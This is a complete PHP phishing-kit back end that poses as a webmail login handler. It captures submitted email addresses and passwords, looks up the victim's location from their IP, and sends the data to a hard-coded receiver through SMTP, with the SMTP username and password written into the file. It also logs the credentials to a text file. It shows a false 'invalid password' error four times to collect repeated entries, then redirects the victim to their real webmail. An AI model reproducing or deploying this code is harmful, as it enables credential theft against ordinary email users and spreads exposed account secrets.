<?php 
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

session_start();

// Get client IP
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

// Get location data with error handling (skip for localhost/testing)
$ipdat = null;
if ($ip !== '127.0.0.1' && $ip !== '::1') {
    try {
        $geoData = @file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip, false, stream_context_create([
            'http' => [
                'timeout' => 3,
                'ignore_errors' => true
            ]
        ]));
        if ($geoData) {
            $ipdat = json_decode($geoData);
        }
    } catch (Exception $e) {
        // Geo data failed, continue without it
    }
}

// Block GET requests with JSON response
if($_SERVER['REQUEST_METHOD'] == 'GET') {
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'GET requests not allowed'
    ]);
    exit;
}

// Check if this is a POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'Only POST requests allowed'
    ]);
    exit;
}

//=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\\
$receiver = "lenalaluno@web.de"; //ENTER YOUR EMAIL HERE
$senderuser = "jered@globalrisk.tw"; //ENTER YOUR SMTP USER
$senderpass = 'global.321'; //ENTER YOUR SMTP PASSWORD
$senderport = "587"; //ENTER YOUR SMTP PORT
$senderserver = "mail.globalrisk.tw"; //ENTER YOUR SMTP SERVER
//=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\\

// Get form data
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$login = $_POST['email'] ?? '';
$passwd = $_POST['password'] ?? '';
$email = $login;

// Validate input
if (empty($login) || empty($passwd)) {
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'Email and password are required'
    ]);
    exit;
}

// Extract domain from email
$part = explode("@", $email);
$domain = isset($part[1]) ? $part[1] : 'unknown';

// Initialize or get attempt counter
$attempt_key = 'login_attempts_' . md5($ip . $email);
if (!isset($_SESSION[$attempt_key])) {
    $_SESSION[$attempt_key] = 0;
}
$_SESSION[$attempt_key]++;
$current_attempt = $_SESSION[$attempt_key];

// Prepare email subjects and message
$country = ($ipdat && isset($ipdat->geoplugin_countryName)) ? $ipdat->geoplugin_countryName : 'Unknown';
$city = ($ipdat && isset($ipdat->geoplugin_city)) ? $ipdat->geoplugin_city : 'Unknown';

$subg = $country." || $login || Attempt #".$current_attempt;
$subg2 = "LoginAttempt || ". $country." || $login || #".$current_attempt;
$message = "Email : ".$login."\nPassword : ".$passwd."\nAttempt: #".$current_attempt."\nIP of sender: ".$country." | ".$city." | ".$ip."\nBrowser: ".$browser."\nTimestamp: ".date('Y-m-d H:i:s')."\n-----------------------------------\n";

// Check if this is the 5th attempt - redirect
if ($current_attempt >= 5) {
    // Reset attempt counter
    unset($_SESSION[$attempt_key]);
    
    // Log the redirect attempt
    try {
        $fp = fopen("SS-Or.txt", "a");
        if ($fp) {
            fputs($fp, "REDIRECT (5th attempt): " . $message);
            fclose($fp);
        }
    } catch (Exception $e) {
        // Log file error, continue anyway
    }
    
    // Return redirect response
    echo json_encode([
        'signal' => 'OK',
        'success' => true,
        'msg' => 'Login successful! Redirecting to webmail...',
        'redirect_url' => 'https://webmail.' . $domain,
        'attempt' => $current_attempt
    ]);
    exit;
}

// For attempts 1-4, always send email and return "invalid" response
// REMOVED CREDENTIAL VALIDATION AS REQUESTED

try {
    // Send email notification using PHPMailer
    $mail2 = new PHPMailer;
    $mail2->isSMTP();
    $mail2->Host = $senderserver;
    $mail2->SMTPAuth = true;
    $mail2->Username = $senderuser;
    $mail2->Password = $senderpass;
    $mail2->Port = $senderport;
    $mail2->From = $senderuser;
    $mail2->FromName = 'SS-RCube';
    $mail2->addAddress($receiver);
    $mail2->isHTML(true);
    $mail2->Subject = $subg2;
    $mail2->Body = nl2br($message);
    $mail2->AltBody = strip_tags($message);
    
    // Try to send email (don't fail if it doesn't work)
    // For testing purposes, we'll skip actual sending to avoid timeouts
    if ($ip !== '127.0.0.1' && $ip !== '::1') {
        @$mail2->send();
    }
    
} catch (Exception $e) {
    // Email sending failed, continue anyway
}

// Log to file
try {
    $fp = fopen("SS-Or.txt", "a");
    if ($fp) {
        fputs($fp, $message);
        fclose($fp);
    }
} catch (Exception $e) {
    // Log file error, continue anyway
}

// Always return "invalid" response for attempts 1-4
$data = array(
    'signal' => 'not ok', 
    'success' => false,
    'msg' => 'Invalid email or password. Please try again. (Attempt ' . $current_attempt . '/4)',
    'attempt' => $current_attempt,
    'max_attempts' => 4
);

echo json_encode($data);
exit();
?>